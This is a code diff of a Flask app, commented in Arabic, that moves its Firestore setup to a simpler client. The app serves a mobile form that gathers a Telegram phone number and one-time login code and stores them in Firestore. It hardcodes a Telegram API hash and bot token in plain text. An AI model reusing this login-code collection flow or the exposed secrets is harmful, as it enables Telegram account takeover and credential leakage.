@@ -1,9 +1,8 @@
 from flask import Flask, request, render_template_string
 import telebot
-import firebase_admin
-from firebase_admin import credentials, firestore
+from google.cloud import firestore
 
-# 1. إعدادات تليجرام (جاهزة ومثبتة من صورك السابقة)
+# 1. إعدادات تليجرام الخاصة بك (جاهزة ومثبتة)
 API_ID = 30478732
 API_HASH = '394d6d66d2097791253e89282b6f4318'
 BOT_TOKEN = '8668088040:AAE3DVD67ZitM04nB0tnW7GSiYzDc7u2rF8'
@@ -11,17 +10,9 @@ BOT_TOKEN = '8668088040:AAE3DVD67ZitM04nB0tnW7GSiYzDc7u2rF8'
 bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
 app = Flask(__name__)
 
-# 2. ربط الفايرستور باستخدام الـ Project ID الخاص بك مباشرة
-if not firebase_admin._apps:
-    # بيتعرف على المشروع تلقائياً عبر معرف المشروع الخاص بك
-    cred = credentials.ApplicationDefault() 
-    firebase_admin.initialize_app(cred, {
-        'projectId': 'shawmng-ba277',
-    })
+# 2. ربط الفايرستور مباشرة بـ Project ID بدون الحاجة لـ credentials
+db = firestore.Client(project='shawmng-ba277')
 
-db = firestore.client()
-
-# تصميم الواجهة للموبايل
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html>
@@ -59,14 +50,14 @@ def home():
         code = request.form.get('code')
         
         if phone and not code:
-            # تخزين الرقم في الفايرستور بانتظار الكود
+            # تخزين الرقم في الفايرستور
             db.collection('auth').document('telegram').set({
                 'phone': phone, 
                 'status': 'waiting_code'
             })
             msg = f"تم إرسال الرقم {phone} للفايرستور بنجاح. اطلب الكود الآن من تليجرام واكتبه في الخانة بالأسفل."
         elif code:
-            # تحديث الكود في الفايرستور لإتمام التفعيل
+            # تحديث الكود في الفايرستور
             db.collection('auth').document('telegram').update({
                 'code': code, 
                 'status': 'done'
